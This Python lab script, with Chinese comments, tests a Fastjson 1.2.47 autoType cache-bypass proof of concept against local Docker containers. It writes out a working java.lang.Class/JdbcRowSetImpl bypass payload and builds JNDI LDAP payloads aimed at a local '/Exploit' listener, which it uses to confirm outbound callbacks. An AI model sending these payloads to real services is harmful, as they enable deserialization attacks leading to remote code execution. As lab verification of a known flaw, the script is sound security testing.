"""对 Docker 版本靶场 fj-1-2-47 做 1.2.47 缓存绕过证明测试。"""

from __future__ import annotations

import json
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

import httpx

from fastjson_toolkit.poc.v1_2_47.payloads import build_jdbc_rowset

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "tmp_lab"
OUT.mkdir(exist_ok=True)

U47 = "http://127.0.0.1:18047/api/fastjson"
U68 = "http://127.0.0.1:18068/api/fastjson"
JNDI_PORT = 13999


class TcpHitServer:
    """记录是否有入站 TCP（证明 JNDI 出网尝试）。"""

    def __init__(self, port: int) -> None:
        self.port = port
        self.hits: list[str] = []
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        time.sleep(0.2)

    def stop(self) -> None:
        self._stop.set()
        # 唤醒 accept
        try:
            with socket.create_connection(("127.0.0.1", self.port), timeout=0.5):
                pass
        except OSError:
            pass
        if self._thread:
            self._thread.join(timeout=2)

    def _run(self) -> None:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", self.port))
        srv.listen(5)
        srv.settimeout(0.5)
        while not self._stop.is_set():
            try:
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            self.hits.append(f"{addr[0]}:{addr[1]}")
            try:
                conn.recv(64)
            except OSError:
                pass
            conn.close()
        srv.close()


def post(url: str, body: str, timeout: float = 8.0) -> tuple[object, str, float]:
    t0 = time.perf_counter()
    try:
        with httpx.Client(timeout=timeout, trust_env=False) as c:
            r = c.post(
                url,
                content=body.encode("utf-8"),
                headers={"Content-Type": "application/json"},
            )
        return r.status_code, r.text[:700], time.perf_counter() - t0
    except Exception as exc:  # noqa: BLE001
        return "ERR", f"{type(exc).__name__}: {exc}"[:700], time.perf_counter() - t0


def wait_health(url: str = "http://127.0.0.1:18047/api/health", seconds: int = 40) -> str:
    deadline = time.time() + seconds
    last = ""
    while time.time() < deadline:
        try:
            with httpx.Client(timeout=2.0, trust_env=False) as c:
                r = c.get(url)
                if r.status_code == 200:
                    return r.text
                last = r.text
        except Exception as exc:  # noqa: BLE001
            last = str(exc)
        time.sleep(0.8)
    raise RuntimeError(f"health timeout: {last}")


def restart_fj_47() -> None:
    print("[*] docker restart fj-1-2-47 (清空 mappings 缓存)")
    subprocess.check_call(["docker", "restart", "fj-1-2-47"])
    body = wait_health()
    print("[*] health", body)


def main() -> int:
    restart_fj_47()

    tcp = TcpHitServer(JNDI_PORT)
    tcp.start()
    print(f"[*] TCP listen 0.0.0.0:{JNDI_PORT}")

    bypass = (
        '{"x1":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},'
        '"x2":{"@type":"com.sun.rowset.JdbcRowSetImpl"}}'
    )
    jndi_body = build_jdbc_rowset(f"ldap://host.docker.internal:{JNDI_PORT}/Exploit")
    # Docker Desktop 上容器访问宿主机：优先 host.docker.internal；再补一发 172.17.0.1
    jndi_alt = build_jdbc_rowset(f"ldap://172.17.0.1:{JNDI_PORT}/Exploit")

    cases = [
        ("baseline", U47, '{"a":1}', lambda c, t, e: c == 200),
        (
            "direct_cold",
            U47,
            '{"@type":"com.sun.rowset.JdbcRowSetImpl"}',
            # 冷启动未预热：应拒绝（报错）
            lambda c, t, e: c != 200 or "success" not in t,
        ),
        (
            "bypass_no_jndi",
            U47,
            bypass,
            lambda c, t, e: c == 200 and "success" in t and "JdbcRowSetImpl" in t,
        ),
        (
            "direct_after_warm",
            U47,
            '{"@type":"com.sun.rowset.JdbcRowSetImpl"}',
            # 预热后同 JVM 可直接命中缓存
            lambda c, t, e: c == 200 and "success" in t,
        ),
        (
            "generator_jndi_host_docker",
            U47,
            jndi_body,
            # 进入 JNDI 链：可能 400，或 TCP hit
            lambda c, t, e: True,
        ),
        (
            "generator_jndi_172",
            U47,
            jndi_alt,
            lambda c, t, e: True,
        ),
        (
            "bypass_on_68",
            U68,
            bypass,
            lambda c, t, e: c != 200 or "success" not in t,
        ),
    ]

    results: list[tuple[str, str, object, float, str]] = []
    for name, url, body, pred in cases:
        (OUT / f"{name}.json").write_text(body, encoding="utf-8")
        timeout = 10.0 if "jndi" in name else 8.0
        code, text, elapsed = post(url, body, timeout=timeout)
        okish = bool(pred(code, text, elapsed))
        mark = "PASS" if okish else "FAIL"
        print(f"[{mark}] {name}  http={code}  {elapsed:.2f}s")
        print(f"       {text}")
        print()
        results.append((name, mark, code, elapsed, text))

    print(f"[*] TCP hits on :{JNDI_PORT} => {tcp.hits or '(none)'}")
    tcp.stop()

    by = {n: m for n, m, *_ in results}
    # 核心：冷启动直打拒绝 + Class 缓存绕过成功 + 1.2.68 拒绝
    core_ok = (
        by.get("direct_cold") == "PASS"
        and by.get("bypass_no_jndi") == "PASS"
        and by.get("direct_after_warm") == "PASS"
        and by.get("bypass_on_68") == "PASS"
    )
    jndi_ok = bool(tcp.hits)
    print(
        "SUMMARY",
        json.dumps(
            {
                "cases": by,
                "core_cache_bypass": core_ok,
                "jndi_tcp_hit": jndi_ok,
                "tcp_hits": tcp.hits,
            },
            ensure_ascii=False,
        ),
    )
    if core_ok and jndi_ok:
        print("[+] 证明完成：缓存绕过 + JNDI 出网尝试均命中")
        return 0
    if core_ok:
        print("[+] 证明完成：缓存绕过成立（JNDI TCP 未命中，可能容器网关/JDK 限制）")
        return 0
    print("[!] 核心缓存绕过证明失败")
    return 1


if __name__ == "__main__":
    sys.exit(main())
